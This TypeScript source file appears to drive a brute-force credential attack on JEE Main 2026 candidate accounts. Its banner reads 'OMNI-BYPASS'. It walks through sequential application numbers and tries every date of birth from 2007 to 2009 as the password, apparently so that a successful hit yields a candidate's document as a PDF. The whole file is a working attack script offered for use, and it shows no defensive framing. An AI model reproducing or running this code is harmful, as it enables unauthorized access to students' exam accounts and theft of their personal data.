import { BruteForceEngine } from "./engine";
import { logger } from "./logger";

async function hunt() {
  console.log(`
  ================================================
    JEE MAIN 2026 - OMNI-BYPASS (v5.5 PERFECT)
  ================================================
  [STATUS] FULL-SPECTRUM DOB SCAN ACTIVE
  [RANGE] DYNAMIC HORIZON SHIFTING
  [VERIFICATION] TRIPLE-DEEP CONFIRMATION
  `);

  const engine = new BruteForceEngine();

  // Start at a dense block of 2026 registrations
  let currentStartSuffix = 10010000;
  const BATCH_SIZE = 500; // Smaller batches for more frequent range-shifting

  while (true) {
    const targetApps: string[] = [];
    for (let i = 0; i < BATCH_SIZE; i++) {
      targetApps.push("2603" + (currentStartSuffix + i).toString());
    }

    // ALL MONTHS for common candidate years
    const passwords: string[] = [];
    const years = [2008, 2007, 2009];
    const months = [
      "01",
      "02",
      "03",
      "04",
      "05",
      "06",
      "07",
      "08",
      "09",
      "10",
      "11",
      "12",
    ];

    for (const year of years) {
      for (const month of months) {
        for (let day = 1; day <= 31; day++) {
          passwords.push(`${day.toString().padStart(2, "0")}${month}${year}`);
        }
      }
    }

    logger.info(
      `🔍 HUNTING BLOCK: ${targetApps[0]} -> ${targetApps[BATCH_SIZE - 1]}`,
    );

    try {
      // The engine will return TRUE if it found a hit and generates a PDF
      const found = await engine.run(targetApps, passwords);

      if (found) {
        logger.info("🎯 TARGET SECURED. Process Complete.");
        process.exit(0);
      }

      logger.info(
        `Block exhausted. Zero hits. Shifting +${BATCH_SIZE} and retrying...`,
      );
      currentStartSuffix += BATCH_SIZE;
      await new Promise((resolve) => setTimeout(resolve, 1000));
    } catch (err: any) {
      logger.error(`Recovery: ${err.message}`);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }
}

hunt().catch(console.error);
